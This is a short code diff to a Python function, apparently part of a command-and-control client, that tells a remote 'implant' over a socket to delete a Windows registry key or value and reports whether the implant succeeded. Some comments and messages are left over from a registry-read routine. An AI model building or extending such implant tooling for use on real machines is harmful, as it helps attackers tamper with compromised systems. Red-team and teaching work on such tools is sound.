@@ -154,8 +154,41 @@ Returns:
 '''
 def regDelete(sock, isKey, keyPath, valueName):
     try:
+         # First tell our implant we want to delete a registry key 
+        print("Sending command...")
+        sock.send(bytes(str(REGDELETE), "utf-8") + b'\x00')
+        time.sleep(WAIT_TIME)
+
+        # Send whether or not we're deleting a key or value 
+        print("Sending delete key... (%i)" % isKey)
+        sock.send(isKey + b'\x00')
+        time.sleep(WAIT_TIME)
+
+        # Send key path to read
+        print("Sending key path...")
+        sock.send(keyPath + b'\x00')
+        time.sleep(WAIT_TIME)
+
+        # Send value/key name to delete
+        print("Sending value/key name...")
+        sock.send(valueName + b'\x00')
+        time.sleep(WAIT_TIME)
+
+        # Receiving key value here... probably need a size first 
+        data = sock.recv(7)
+        data = data.strip()
+        data = data.decode('utf-8')
+
+        if (data == "SUCCESS"):
+            print("Successful reg read file! Getting key size...")
+
+        else:
+            print("Implant returned FAILURE!\n")
+            print(data)
+            return FAILURE
 
         return SUCCESS
+    
     
     except Exception as e:
         print("ERROR: Could not send reg delete to implant: ", e)
